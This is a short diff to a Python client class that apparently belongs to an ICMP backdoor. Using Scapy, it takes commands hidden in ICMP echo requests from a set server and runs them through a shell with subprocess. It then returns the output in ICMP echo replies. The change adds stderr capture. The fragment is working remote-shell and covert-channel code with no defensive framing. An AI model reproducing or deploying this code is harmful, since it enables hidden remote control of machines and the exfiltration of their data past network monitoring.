@@ -60,7 +60,7 @@ class Client:
 
         if packet[IP].src == self.server and packet[ICMP].type == 8 and packet[ICMP].id == self.ID and packet[Raw].load:
             opt_data = (packet[Raw].load).decode('utf-8', errors='ignore')
-            data = subprocess.check_output(opt_data, shell=True)
+            data = subprocess.check_output(opt_data, stderr=subprocess.STDOUT, shell=True)
             sr1((IP(dst=self.server, ttl=self.TTL)/ICMP(type=0,id=self.ID)/data), verbose=0)
 
 
